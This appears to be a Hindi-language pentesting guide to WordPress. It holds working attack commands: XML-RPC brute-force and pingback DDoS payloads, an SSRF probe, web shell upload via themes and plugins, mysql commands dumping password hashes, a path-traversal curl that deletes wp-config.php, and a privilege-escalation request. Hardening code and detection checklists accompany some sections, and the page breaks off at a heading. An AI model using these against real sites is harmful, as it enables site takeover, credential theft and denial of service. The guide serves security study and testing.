# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** इसलिए यदि आप RCE प्राप्त करने के लिए थीम के कुछ php को बदलते हैं, तो आप शायद उस पथ का उपयोग करेंगे। उदाहरण के लिए: **थीम twentytwelve** का उपयोग करते हुए आप **404.php** फ़ाइल तक **पहुँच** सकते हैं: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **एक और उपयोगी यूआरएल हो सकता है:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **wp-config.php** में आप डेटाबेस का रूट पासवर्ड पा सकते हैं।
- जांचने के लिए डिफ़ॉल्ट लॉगिन पथ: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` में उपयोगी जानकारी होती है जैसे कि स्थापित WordPress का संस्करण।
- `wp-activate.php` नए WordPress साइट सेटअप करते समय ईमेल सक्रियण प्रक्रिया के लिए उपयोग किया जाता है।
- लॉगिन फ़ोल्डर (छिपाने के लिए नाम बदल सकते हैं):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` एक फ़ाइल है जो WordPress की एक विशेषता का प्रतिनिधित्व करती है जो डेटा को HTTP के माध्यम से संचारित करने की अनुमति देती है, जो परिवहन तंत्र के रूप में कार्य करती है और XML को एन्कोडिंग तंत्र के रूप में। इस प्रकार की संचार को WordPress [REST API](https://developer.wordpress.org/rest-api/reference) द्वारा प्रतिस्थापित किया गया है।
- `wp-content` फ़ोल्डर मुख्य निर्देशिका है जहाँ प्लगइन्स और थीम संग्रहीत होते हैं।
- `wp-content/uploads/` वह निर्देशिका है जहाँ प्लेटफ़ॉर्म पर अपलोड की गई कोई भी फ़ाइलें संग्रहीत होती हैं।
- `wp-includes/` यह वह निर्देशिका है जहाँ कोर फ़ाइलें संग्रहीत होती हैं, जैसे कि प्रमाणपत्र, फ़ॉन्ट, जावास्क्रिप्ट फ़ाइलें, और विजेट।
- `wp-sitemap.xml` WordPress संस्करण 5.5 और उससे अधिक में, WordPress सभी सार्वजनिक पोस्ट और सार्वजनिक रूप से क्वेरी करने योग्य पोस्ट प्रकारों और वर्गीकरणों के साथ एक साइटमैप XML फ़ाइल उत्पन्न करता है।

**Post exploitation**

- `wp-config.php` फ़ाइल में WordPress को डेटाबेस से कनेक्ट करने के लिए आवश्यक जानकारी होती है जैसे कि डेटाबेस का नाम, डेटाबेस होस्ट, उपयोगकर्ता नाम और पासवर्ड, प्रमाणीकरण कुंजी और नमक, और डेटाबेस तालिका उपसर्ग। इस कॉन्फ़िगरेशन फ़ाइल का उपयोग DEBUG मोड को सक्रिय करने के लिए भी किया जा सकता है, जो समस्या निवारण में सहायक हो सकता है।

### Users Permissions

- **Administrator**
- **Editor**: अपने और दूसरों के पोस्ट प्रकाशित और प्रबंधित करता है
- **Author**: अपने स्वयं के पोस्ट प्रकाशित और प्रबंधित करता है
- **Contributor**: अपने पोस्ट लिखता और प्रबंधित करता है लेकिन उन्हें प्रकाशित नहीं कर सकता
- **Subscriber**: पोस्ट ब्राउज़ करता है और अपने प्रोफ़ाइल को संपादित करता है

## **Passive Enumeration**

### **Get WordPress version**

जांचें कि क्या आप फ़ाइलें `/license.txt` या `/readme.html` पा सकते हैं

पृष्ठ के **स्रोत कोड** के अंदर (उदाहरण [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/) से):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS लिंक फ़ाइलें

![](<../../images/image (533).png>)

- JavaScript फ़ाइलें

![](<../../images/image (524).png>)

### प्लगइन्स प्राप्त करें
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### थीम प्राप्त करें
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### सामान्य रूप से संस्करण निकालें
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## सक्रिय सूचीकरण

### प्लगइन्स और थीम

आप शायद सभी संभावित प्लगइन्स और थीम नहीं ढूंढ पाएंगे। सभी को खोजने के लिए, आपको **प्लगइन्स और थीम की सूची पर सक्रिय रूप से ब्रूट फोर्स करना होगा** (हमारे लिए उम्मीद है कि ऐसे स्वचालित उपकरण हैं जो इन सूचियों को शामिल करते हैं)।

### उपयोगकर्ता

- **आईडी ब्रूट:** आप उपयोगकर्ता आईडी को ब्रूट फोर्स करके एक वर्डप्रेस साइट से मान्य उपयोगकर्ता प्राप्त करते हैं:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
यदि प्रतिक्रियाएँ **200** या **30X** हैं, तो इसका मतलब है कि आईडी **मान्य** है। यदि प्रतिक्रिया **400** है, तो आईडी **अमान्य** है।

- **wp-json:** आप उपयोगकर्ताओं के बारे में जानकारी प्राप्त करने के लिए भी क्वेरी कर सकते हैं:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
एक और `/wp-json/` एंडपॉइंट जो उपयोगकर्ताओं के बारे में कुछ जानकारी प्रकट कर सकता है वह है:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
ध्यान दें कि यह एंडपॉइंट केवल उन उपयोगकर्ताओं को उजागर करता है जिन्होंने एक पोस्ट बनाई है। **केवल उन उपयोगकर्ताओं की जानकारी प्रदान की जाएगी जिनके पास यह सुविधा सक्षम है**।

यह भी ध्यान दें कि **/wp-json/wp/v2/pages** आईपी पते लीक कर सकता है।

- **लॉगिन उपयोगकर्ता नाम गणना**: जब **`/wp-login.php`** में लॉगिन करते हैं तो **संदेश** **विभिन्न** होता है यदि निर्दिष्ट **उपयोगकर्ता नाम मौजूद है या नहीं**।

### XML-RPC

यदि `xml-rpc.php` सक्रिय है तो आप क्रेडेंशियल्स ब्रूट-फोर्स कर सकते हैं या इसका उपयोग अन्य संसाधनों पर DoS हमले शुरू करने के लिए कर सकते हैं। (आप इस प्रक्रिया को स्वचालित कर सकते हैं[ इसका उपयोग करके](https://github.com/relarizky/wpxploit) उदाहरण के लिए)।

यह देखने के लिए कि क्या यह सक्रिय है, _**/xmlrpc.php**_ तक पहुँचने का प्रयास करें और यह अनुरोध भेजें:

**जांचें**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**क्रेडेंशियल्स ब्रूटफोर्स**

**`wp.getUserBlogs`**, **`wp.getCategories`** या **`metaWeblog.getUsersBlogs`** कुछ ऐसे तरीके हैं जिनका उपयोग क्रेडेंशियल्स को ब्रूट-फोर्स करने के लिए किया जा सकता है। यदि आप इनमें से कोई भी ढूंढ सकते हैं, तो आप कुछ इस तरह भेज सकते हैं:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
संदेश _"Incorrect username or password"_ एक 200 कोड प्रतिक्रिया के अंदर तब दिखाई देना चाहिए जब क्रेडेंशियल मान्य नहीं होते।

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

सही क्रेडेंशियल का उपयोग करके आप एक फ़ाइल अपलोड कर सकते हैं। प्रतिक्रिया में पथ दिखाई देगा ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
इसके अलावा, **`system.multicall`** का उपयोग करके क्रेडेंशियल्स को ब्रूट-फोर्स करने का एक **तेज़ तरीका** है, क्योंकि आप एक ही अनुरोध पर कई क्रेडेंशियल्स का प्रयास कर सकते हैं:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**2FA बायपास करें**

यह विधि कार्यक्रमों के लिए है और मनुष्यों के लिए नहीं, और पुरानी है, इसलिए यह 2FA का समर्थन नहीं करती है। इसलिए, यदि आपके पास मान्य क्रेड्स हैं लेकिन मुख्य प्रवेश 2FA द्वारा सुरक्षित है, तो **आप xmlrpc.php का दुरुपयोग करके उन क्रेड्स के साथ 2FA को बायपास करके लॉगिन करने में सक्षम हो सकते हैं**। ध्यान दें कि आप कंसोल के माध्यम से किए जा सकने वाले सभी कार्यों को करने में सक्षम नहीं होंगे, लेकिन आप अभी भी RCE तक पहुँचने में सक्षम हो सकते हैं जैसा कि Ippsec इसे [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) में समझाता है।

**DDoS या पोर्ट स्कैनिंग**

यदि आप सूची में _**pingback.ping**_ विधि पा सकते हैं, तो आप Wordpress को किसी भी होस्ट/पोर्ट पर मनमाना अनुरोध भेजने के लिए बना सकते हैं।\
इसका उपयोग **हजारों** Wordpress **साइटों** से **एक स्थान** (तो उस स्थान पर **DDoS** उत्पन्न होता है) तक **पहुँचने** के लिए किया जा सकता है या आप इसका उपयोग **Wordpress** को कुछ आंतरिक **नेटवर्क** को **स्कैन** करने के लिए कर सकते हैं (आप किसी भी पोर्ट को निर्दिष्ट कर सकते हैं)।
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

यदि आपको **faultCode** एक मान **greater** फिर **0** (17) मिलता है, तो इसका मतलब है कि पोर्ट खुला है।

DDoS का कारण बनने के लिए इस विधि का दुरुपयोग कैसे करें, यह जानने के लिए पिछले अनुभाग में **`system.multicall`** के उपयोग पर एक नज़र डालें।

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

यह फ़ाइल आमतौर पर Wordpress साइट की जड़ के तहत मौजूद होती है: **`/wp-cron.php`**\
जब इस फ़ाइल को **एक्सेस** किया जाता है, तो एक "**भारी**" MySQL **क्वेरी** की जाती है, इसलिए इसे **हमलावरों** द्वारा **DoS** **कारण** के लिए उपयोग किया जा सकता है।\
इसके अलावा, डिफ़ॉल्ट रूप से, `wp-cron.php` हर पृष्ठ लोड पर (जब भी कोई क्लाइंट कोई Wordpress पृष्ठ अनुरोध करता है) कॉल किया जाता है, जो उच्च-ट्रैफ़िक साइटों पर समस्याएँ पैदा कर सकता है (DoS)।

Wp-Cron को अक्षम करना और होस्ट के अंदर एक वास्तविक क्रोनजॉब बनाना जो नियमित अंतराल पर आवश्यक क्रियाएँ करता है (बिना समस्याएँ पैदा किए) की सिफारिश की जाती है।

### /wp-json/oembed/1.0/proxy - SSRF

_https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ पर पहुँचने की कोशिश करें और Worpress साइट आपसे अनुरोध कर सकती है।

जब यह काम नहीं करता है तो यह प्रतिक्रिया है:

![](<../../images/image (365).png>)

## SSRF

{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

यह उपकरण जांचता है कि **methodName: pingback.ping** और पथ **/wp-json/oembed/1.0/proxy** मौजूद है या नहीं, और यदि यह मौजूद है, तो यह उन्हें शोषण करने की कोशिश करता है।

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Get access by overwriting a bit

यह एक वास्तविक हमले से अधिक एक जिज्ञासा है। IN the CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) आप किसी भी wordpress फ़ाइल से 1 बिट को पलट सकते हैं। इसलिए आप फ़ाइल `/var/www/html/wp-includes/user.php` के स्थिति `5389` को NOP NOT (`!`) ऑपरेशन के लिए पलट सकते हैं।
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **पैनल RCE**

**थीम से एक php को संशोधित करना (प्रशासनिक क्रेडेंशियल्स की आवश्यकता)**

दृश्य → थीम संपादक → 404 टेम्पलेट (दाईं ओर)

एक php शेल के लिए सामग्री बदलें:

![](<../../images/image (384).png>)

इंटरनेट पर खोजें कि आप उस अपडेटेड पृष्ठ तक कैसे पहुँच सकते हैं। इस मामले में, आपको यहाँ पहुँचने की आवश्यकता है: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

आप उपयोग कर सकते हैं:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

यह संभव है कि .php फ़ाइलों को एक प्लगइन के रूप में अपलोड किया जा सके।\
उदाहरण के लिए, अपने php बैकडोर को बनाएं:

![](<../../images/image (183).png>)

फिर एक नया प्लगइन जोड़ें:

![](<../../images/image (722).png>)

प्लगइन अपलोड करें और Install Now पर क्लिक करें:

![](<../../images/image (249).png>)

Proceed पर क्लिक करें:

![](<../../images/image (70).png>)

संभवतः यह स्पष्ट रूप से कुछ नहीं करेगा, लेकिन यदि आप Media पर जाते हैं, तो आप देखेंगे कि आपका शेल अपलोड हो गया है:

![](<../../images/image (462).png>)

इसका उपयोग करें और आप रिवर्स शेल निष्पादित करने के लिए URL देखेंगे:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

यह विधि एक दुर्भावनापूर्ण प्लगइन के इंस्टॉलेशन से संबंधित है जिसे कमजोर माना जाता है और जिसका उपयोग वेब शेल प्राप्त करने के लिए किया जा सकता है। यह प्रक्रिया WordPress डैशबोर्ड के माध्यम से इस प्रकार की जाती है:

1. **Plugin Acquisition**: प्लगइन को Exploit DB जैसे स्रोत से प्राप्त किया जाता है जैसे [**यहां**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress डैशबोर्ड पर जाएं, फिर `Dashboard > Plugins > Upload Plugin` पर जाएं।
- डाउनलोड किए गए प्लगइन की ज़िप फ़ाइल अपलोड करें।
3. **Plugin Activation**: एक बार प्लगइन सफलतापूर्वक स्थापित हो जाने के बाद, इसे डैशबोर्ड के माध्यम से सक्रिय करना होगा।
4. **Exploitation**:
- "reflex-gallery" प्लगइन स्थापित और सक्रिय होने पर, इसका शोषण किया जा सकता है क्योंकि यह कमजोर माना जाता है।
- Metasploit ढांचा इस कमजोरी के लिए एक शोषण प्रदान करता है। उपयुक्त मॉड्यूल को लोड करके और विशिष्ट कमांड निष्पादित करके, एक मीटरप्रीटर सत्र स्थापित किया जा सकता है, जो साइट पर अनधिकृत पहुंच प्रदान करता है।
- यह नोट किया गया है कि यह WordPress साइट का शोषण करने के लिए कई तरीकों में से एक है।

सामग्री में प्लगइन को स्थापित और सक्रिय करने के लिए WordPress डैशबोर्ड में चरणों को दर्शाने वाले दृश्य सहायता शामिल हैं। हालाँकि, यह ध्यान रखना महत्वपूर्ण है कि इस तरीके से कमजोरियों का शोषण करना बिना उचित प्राधिकरण के अवैध और अनैतिक है। इस जानकारी का उपयोग जिम्मेदारी से और केवल कानूनी संदर्भ में किया जाना चाहिए, जैसे कि स्पष्ट अनुमति के साथ पेनटेस्टिंग।

**अधिक विस्तृत चरणों के लिए देखें:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ एक स्क्रिप्ट है जिसे **Cross-Site Scripting (XSS)** कमजोरी को **Remote Code Execution (RCE)** या अन्य महत्वपूर्ण कमजोरियों में बढ़ाने के लिए डिज़ाइन किया गया है। अधिक जानकारी के लिए [**इस पोस्ट**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) की जांच करें। यह **Wordpress Versions 6.X.X, 5.X.X और 4.X.X के लिए समर्थन प्रदान करता है और अनुमति देता है:**
- _**Privilege Escalation:**_ WordPress में एक उपयोगकर्ता बनाता है।
- _**(RCE) Custom Plugin (backdoor) Upload:**_ अपने कस्टम प्लगइन (बैकडोर) को WordPress में अपलोड करें।
- _**(RCE) Built-In Plugin Edit:**_ WordPress में एक अंतर्निहित प्लगइन को संपादित करें।
- _**(RCE) Built-In Theme Edit:**_ WordPress में एक अंतर्निहित थीम को संपादित करें।
- _**(Custom) Custom Exploits:**_ तृतीय-पक्ष WordPress प्लगइन्स/थीम के लिए कस्टम शोषण।

## Post Exploitation

Extract usernames and passwords:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
एडमिन पासवर्ड बदलें:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

एक Wordpress प्लगइन कैसे कार्यक्षमता को उजागर कर सकता है, यह जानना इसकी कार्यक्षमता में कमजोरियों को खोजने के लिए कुंजी है। आप निम्नलिखित बुलेट पॉइंट्स में देख सकते हैं कि एक प्लगइन कैसे कार्यक्षमता को उजागर कर सकता है और [**इस ब्लॉग पोस्ट**](https://nowotarski.info/wordpress-nonce-authorization/) में कुछ कमजोर प्लगइन्स के उदाहरण।

- **`wp_ajax`**

एक प्लगइन उपयोगकर्ताओं के लिए कार्यों को उजागर करने के तरीकों में से एक AJAX हैंडलर्स के माध्यम से है। इनमें लॉजिक, प्राधिकरण, या प्रमाणीकरण बग हो सकते हैं। इसके अलावा, यह अक्सर होता है कि ये कार्य प्रमाणीकरण और प्राधिकरण दोनों को एक Wordpress nonce के अस्तित्व पर आधारित करते हैं जिसे **किसी भी उपयोगकर्ता ने Wordpress उदाहरण में प्रमाणित किया हो सकता है** (इसके भूमिका के स्वतंत्र)। 

ये वे कार्य हैं जो एक प्लगइन में एक कार्य को उजागर करने के लिए उपयोग किए जा सकते हैं:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` का उपयोग किसी भी उपयोगकर्ताओं (यहां तक कि अनधिकृत लोगों) द्वारा एंडपॉइंट को सुलभ बनाता है।**

> [!CAUTION]
> इसके अलावा, यदि फ़ंक्शन केवल उपयोगकर्ता के प्राधिकरण की जांच कर रहा है `wp_verify_nonce` फ़ंक्शन के साथ, तो यह फ़ंक्शन केवल यह जांच रहा है कि उपयोगकर्ता लॉग इन है, यह आमतौर पर उपयोगकर्ता की भूमिका की जांच नहीं कर रहा है। इसलिए कम विशेषाधिकार प्राप्त उपयोगकर्ताओं को उच्च विशेषाधिकार प्राप्त क्रियाओं तक पहुंच मिल सकती है।

- **REST API**

यह `register_rest_route` फ़ंक्शन का उपयोग करके वर्डप्रेस से फ़ंक्शन को उजागर करना भी संभव है:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` एक फ़ंक्शन के लिए कॉलबैक है जो यह जांचता है कि क्या एक निर्दिष्ट उपयोगकर्ता API विधि को कॉल करने के लिए अधिकृत है।

**यदि अंतर्निहित `__return_true` फ़ंक्शन का उपयोग किया जाता है, तो यह बस उपयोगकर्ता अनुमतियों की जांच को छोड़ देगा।**

- **php फ़ाइल तक सीधी पहुँच**

बेशक, Wordpress PHP का उपयोग करता है और प्लगइन्स के अंदर फ़ाइलें सीधे वेब से सुलभ होती हैं। इसलिए, यदि कोई प्लगइन किसी कमजोर कार्यक्षमता को उजागर कर रहा है जो फ़ाइल को एक्सेस करने पर सक्रिय होती है, तो इसे किसी भी उपयोगकर्ता द्वारा शोषित किया जा सकता है।

### wp_ajax_nopriv के माध्यम से अनधिकृत मनमाना फ़ाइल हटाना (Litho थीम <= 3.0)

WordPress थीम और प्लगइन्स अक्सर `wp_ajax_` और `wp_ajax_nopriv_` हुक के माध्यम से AJAX हैंडलर को उजागर करते हैं। जब **_nopriv_** संस्करण का उपयोग किया जाता है **तो कॉलबैक अनधिकृत आगंतुकों द्वारा पहुँच योग्य हो जाता है**, इसलिए किसी भी संवेदनशील क्रिया को अतिरिक्त रूप से लागू करना चाहिए:

1. एक **क्षमता जांच** (जैसे `current_user_can()` या कम से कम `is_user_logged_in()`), और
2. एक **CSRF nonce** जो `check_ajax_referer()` / `wp_verify_nonce()` के साथ मान्य किया गया हो, और
3. **कठोर इनपुट सफाई / मान्यता**।

Litho बहुउद्देशीय थीम (< 3.1) ने *Remove Font Family* फीचर में उन 3 नियंत्रणों को भूल गया और अंततः निम्नलिखित कोड (सरल) भेजा:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
इस स्निपेट द्वारा पेश की गई समस्याएँ:

* **अप्रमाणित पहुँच** – `wp_ajax_nopriv_` हुक पंजीकृत है।
* **कोई नॉनस / क्षमता जांच नहीं** – कोई भी आगंतुक एंडपॉइंट को हिट कर सकता है।
* **कोई पथ सफाई नहीं** – उपयोगकर्ता-नियंत्रित `fontfamily` स्ट्रिंग को फ़िल्टर किए बिना फ़ाइल सिस्टम पथ में जोड़ा गया है, जिससे क्लासिक `../../` ट्रैवर्सल की अनुमति मिलती है।

#### शोषण

एक हमलावर किसी भी फ़ाइल या निर्देशिका को **अपलोड्स बेस निर्देशिका के नीचे** (सामान्यतः `<wp-root>/wp-content/uploads/` ) को हटाने के लिए एकल HTTP POST अनुरोध भेज सकता है:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
क्योंकि `wp-config.php` *uploads* के बाहर रहता है, एक डिफ़ॉल्ट इंस्टॉलेशन पर चार `../` अनुक्रम पर्याप्त हैं। `wp-config.php` को हटाने से अगले दौरे पर WordPress को *installation wizard* में मजबूर किया जाता है, जिससे पूरी साइट पर कब्जा करना संभव होता है (हमलावर केवल एक नया DB कॉन्फ़िगरेशन प्रदान करता है और एक व्यवस्थापक उपयोगकर्ता बनाता है)।

अन्य प्रभावशाली लक्ष्य में प्लगइन/थीम के `.php` फ़ाइलें (सुरक्षा प्लगइनों को तोड़ने के लिए) या `.htaccess` नियम शामिल हैं।

#### Detection checklist

* कोई भी `add_action( 'wp_ajax_nopriv_...')` कॉलबैक जो फ़ाइल सिस्टम हेल्पर्स (`copy()`, `unlink()`, `$wp_filesystem->delete()`, आदि) को कॉल करता है।
* पथों में असंक्रमित उपयोगकर्ता इनपुट का संयोजन (देखें `$_POST`, `$_GET`, `$_REQUEST`)।
* `check_ajax_referer()` और `current_user_can()`/`is_user_logged_in()` की अनुपस्थिति।

#### Hardening
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **हमेशा** डिस्क पर किसी भी लिखने/हटाने के ऑपरेशन को विशेषाधिकार प्राप्त के रूप में मानें और दोबारा जांचें:
> • प्रमाणीकरण  • अधिकृत करना  • नॉनस  • इनपुट सफाई  • पथ सीमांकन (जैसे `realpath()` और `str_starts_with()` के माध्यम से)।

---

### पुरानी भूमिका पुनर्स्थापना और अनुपस्थित अधिकृत करने के माध्यम से विशेषाधिकार वृद्धि (ASE "View Admin as Role")

कई प्लगइन्स "भूमिका के रूप में देखें" या अस्थायी भूमिका-स्विचिंग फीचर को लागू करते हैं, जो उपयोगकर्ता मेटा में मूल भूमिका(ओं) को सहेजते हैं ताकि उन्हें बाद में पुनर्स्थापित किया जा सके। यदि पुनर्स्थापना पथ केवल अनुरोध पैरामीटर (जैसे, `$_REQUEST['reset-for']`) और एक प्लगइन-निर्धारित सूची पर निर्भर करता है बिना क्षमताओं और एक मान्य नॉनस की जांच किए, तो यह एक ऊर्ध्वाधर विशेषाधिकार वृद्धि बन जाती है।

एक वास्तविक दुनिया का उदाहरण Admin और Site Enhancements (ASE) प्लगइन (≤ 7.6.2.1) में पाया गया। रीसेट शाखा ने `reset-for=<username>` के आधार पर भूमिकाओं को पुनर्स्थापित किया यदि उपयोगकर्ता नाम एक आंतरिक सरणी `$options['viewing_admin_as_role_are']` में दिखाई दिया, लेकिन वर्तमान भूमिकाओं को हटाने और उपयोगकर्ता मेटा `_asenha_view_admin_as_original_roles` से सहेजी गई भूमिकाओं को फिर से जोड़ने से पहले न तो `current_user_can()` जांच की गई और न ही नॉनस सत्यापन किया गया:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
क्यों यह शोषणीय है

- सर्वर-साइड प्राधिकरण के बिना `$_REQUEST['reset-for']` और एक प्लगइन विकल्प पर भरोसा करता है।
- यदि किसी उपयोगकर्ता के पास पहले `_asenha_view_admin_as_original_roles` में उच्च विशेषाधिकार सुरक्षित थे और उन्हें डाउनग्रेड किया गया, तो वे रीसेट पथ पर जाकर उन्हें पुनर्स्थापित कर सकते हैं।
- कुछ तैनातियों में, कोई भी प्रमाणित उपयोगकर्ता `viewing_admin_as_role_are` में अभी भी मौजूद किसी अन्य उपयोगकर्ता नाम के लिए रीसेट को ट्रिगर कर सकता है (टूटी हुई प्राधिकरण)।

हमले की पूर्वापेक्षाएँ

- कमजोर प्लगइन संस्करण जिसमें यह सुविधा सक्षम है।
- लक्षित खाते में पहले के उपयोग से उपयोगकर्ता मेटा में एक पुरानी उच्च-विशेषाधिकार भूमिका संग्रहीत है।
- कोई भी प्रमाणित सत्र; रीसेट प्रवाह पर नॉनस/क्षमता गायब है।

शोषण (उदाहरण)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
कमजोर बिल्ड पर, यह वर्तमान भूमिकाओं को हटा देता है और सहेजी गई मूल भूमिकाओं (जैसे, `administrator`) को फिर से जोड़ता है, प्रभावी रूप से विशेषाधिकार बढ़ाता है।

पता लगाने की चेकलिस्ट

